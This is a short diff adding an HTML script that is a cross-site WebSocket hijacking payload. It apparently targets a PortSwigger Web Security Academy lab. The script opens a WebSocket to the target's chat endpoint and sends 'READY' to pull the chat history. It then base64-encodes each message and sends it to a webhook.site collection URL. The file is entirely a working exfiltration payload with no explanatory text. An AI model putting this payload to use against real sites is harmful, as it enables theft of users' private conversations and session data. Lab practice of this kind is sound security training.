@@ -1,0 +1,15 @@
+<script>
+    const url = "https://webhook.site/b0fbeb1d-92b2-4f28-ae94-c1a6c1ed0a81?message="
+    const ws_endpoint = "wss://0a1d00860435473281b3c61a00c400ca.web-security-academy.net/chat"
+    let newWebSocket = new WebSocket(ws_endpoint);
+    newWebSocket.onopen = function (evt) {
+        newWebSocket.send("READY");
+
+    }
+    newWebSocket.onmessage = function (evt) {
+        fetch(url + btoa(evt.data), {
+            method: "GET",
+            mode: "no-cors",
+        })
+    };
+</script>
